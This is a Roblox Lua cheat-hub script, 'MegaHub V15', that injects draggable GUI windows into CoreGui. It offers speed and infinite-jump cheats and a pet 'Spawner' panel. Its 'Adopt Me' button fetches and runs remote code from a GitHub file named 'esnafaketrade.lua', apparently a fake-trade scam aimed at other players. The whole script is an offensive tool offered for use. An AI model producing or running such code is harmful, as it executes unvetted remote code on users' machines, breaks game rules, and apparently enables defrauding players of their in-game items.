-- [[ MEGA HUB V15: DRAGGABLE + RESIZABLE ]] --
local CoreGui = game:GetService("CoreGui")
local UIS = game:GetService("UserInputService")
local LP = game:GetService("Players").LocalPlayer
local RS = game:GetService("ReplicatedStorage")

if CoreGui:FindFirstChild("MegaHubV15") then CoreGui.MegaHubV15:Destroy() end
local ScreenGui = Instance.new("ScreenGui", CoreGui)
ScreenGui.Name = "MegaHubV15"

-- --- ADVANCED WINDOW ENGINE (DRAG & RESIZE) ---
local function MakeWindowPro(frame)
    -- Draggable
    local dragging, dragInput, dragStart, startPos
    frame.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 then
            dragging = true dragStart = input.Position startPos = frame.Position
        end
    end)
    UIS.InputChanged:Connect(function(input)
        if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
            local delta = input.Position - dragStart
            frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
        end
    end)
    UIS.InputEnded:Connect(function(input) if input.UserInputType == Enum.UserInputType.MouseButton1 then dragging = false end end)

    -- Resizable Handle
    local resizeBtn = Instance.new("TextButton", frame)
    resizeBtn.Size = UDim2.new(0, 15, 0, 15)
    resizeBtn.Position = UDim2.new(1, -15, 1, -15)
    resizeBtn.Text = "◢" resizeBtn.TextColor3 = Color3.new(1,1,1)
    resizeBtn.BackgroundTransparency = 1

    local resizing = false
    resizeBtn.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 then resizing = true end
    end)
    UIS.InputChanged:Connect(function(input)
        if resizing and input.UserInputType == Enum.UserInputType.MouseMovement then
            local mousePos = UIS:GetMouseLocation()
            local newSizeX = mousePos.X - frame.AbsolutePosition.X
            local newSizeY = (mousePos.Y - 36) - frame.AbsolutePosition.Y -- Offset for Topbar
            frame.Size = UDim2.new(0, math.max(150, newSizeX), 0, math.max(100, newSizeY))
        end
    end)
    UIS.InputEnded:Connect(function(input) if input.UserInputType == Enum.UserInputType.MouseButton1 then resizing = false end end)
end

-- --- 1. THE EMOJI BAR ---
local EmojiBar = Instance.new("Frame", ScreenGui)
EmojiBar.Size = UDim2.new(0, 340, 0, 45)
EmojiBar.Position = UDim2.new(0.5, -170, 0.9, 0)
EmojiBar.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Instance.new("UICorner", EmojiBar)
local eList = Instance.new("UIListLayout", EmojiBar)
eList.FillDirection = "Horizontal" eList.HorizontalAlignment = "Center" eList.VerticalAlignment = "Center" eList.Padding = UDim.new(0, 10)
for _, e in pairs({"👍", "😲", "💯", "👀", "🔥", "❤️", "🎉"}) do
    local b = Instance.new("TextButton", EmojiBar)
    b.Size = UDim2.new(0, 32, 0, 32) b.Text = e b.TextSize = 25 b.BackgroundTransparency = 1
end

-- --- 2. JAZRAD SPAWNER ---
local Spawner = Instance.new("Frame", ScreenGui)
Spawner.Size = UDim2.new(0, 380, 0, 300)
Spawner.Position = UDim2.new(0.4, 0, 0.3, 0)
Spawner.BackgroundColor3 = Color3.fromRGB(30, 32, 38)
Spawner.BorderSizePixel = 2 Spawner.BorderColor3 = Color3.fromRGB(0, 255, 200)
Spawner.Visible = false Instance.new("UICorner", Spawner)
MakeWindowPro(Spawner)

-- (Spawner Contents)
local SHead = Instance.new("TextLabel", Spawner)
SHead.Size = UDim2.new(1, 0, 0, 35) SHead.Text = "Pets  Jaradz Library  Toys"
SHead.TextColor3 = Color3.new(1,1,1) SHead.BackgroundTransparency = 1

local SInput = Instance.new("TextBox", Spawner)
SInput.Size = UDim2.new(0.9, 0, 0, 40) SInput.Position = UDim2.new(0.05, 0, 0.2, 0)
SInput.PlaceholderText = "Enter Name..." SInput.BackgroundColor3 = Color3.fromRGB(45, 47, 52)
SInput.TextColor3 = Color3.new(1,1,1) Instance.new("UICorner", SInput)

-- --- 3. DAISY PRO V2 ---
local Daisy = Instance.new("Frame", ScreenGui)
Daisy.Size = UDim2.new(0, 200, 0, 300) Daisy.Position = UDim2.new(0.7, 0, 0.2, 0)
Daisy.BackgroundColor3 = Color3.fromRGB(15, 15, 15) Instance.new("UICorner", Daisy)
MakeWindowPro(Daisy)

local function DBtn(txt, color, cb)
    local b = Instance.new("TextButton", Daisy)
    b.Size = UDim2.new(0.9, 0, 0, 40) b.Position = UDim2.new(0.05, 0, 0, 10 + (#Daisy:GetChildren()*45))
    b.Text = txt b.BackgroundColor3 = color b.TextColor3 = Color3.new(1,1,1)
    Instance.new("UICorner", b) b.MouseButton1Click:Connect(cb)
end
DBtn("Speed Boost (2x)", Color3.fromRGB(60, 160, 60), function() LP.Character.Humanoid.WalkSpeed = 32 end)
DBtn("Infinite Jump: ON", Color3.fromRGB(40, 100, 180), function() UIS.JumpRequest:Connect(function() LP.Character.Humanoid:ChangeState("Jumping") end) end)

-- --- 4. MAIN NAV ---
local Nav = Instance.new("Frame", ScreenGui)
Nav.Size = UDim2.new(0, 200, 0, 300) Nav.Position = UDim2.new(0.1, 0, 0.2, 0)
Nav.BackgroundColor3 = Color3.fromRGB(15, 15, 15) Instance.new("UICorner", Nav)
MakeWindowPro(Nav)

local ABtn = Instance.new("TextButton", Nav)
ABtn.Size = UDim2.new(1, 0, 0, 50) ABtn.Position = UDim2.new(0, 0, 0.1, 0)
ABtn.Text = "  🐾 Adopt Me" ABtn.BackgroundTransparency = 1 ABtn.TextColor3 = Color3.new(1,1,1) ABtn.TextXAlignment = "Left"
ABtn.MouseButton1Click:Connect(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/xxyourfuckasssoulxxilly/daisyscripts/refs/heads/main/esnafaketrade.lua"))() end)

local SBtn = Instance.new("TextButton", Nav)
SBtn.Size = UDim2.new(1, 0, 0, 50) SBtn.Position = UDim2.new(0, 0, 0.3, 0)
SBtn.Text = "  🎁 Spawner" SBtn.BackgroundTransparency = 1 SBtn.TextColor3 = Color3.new(1,1,1) SBtn.TextXAlignment = "Left"
SBtn.MouseButton1Click:Connect(function() Spawner.Visible = not Spawner.Visible end)
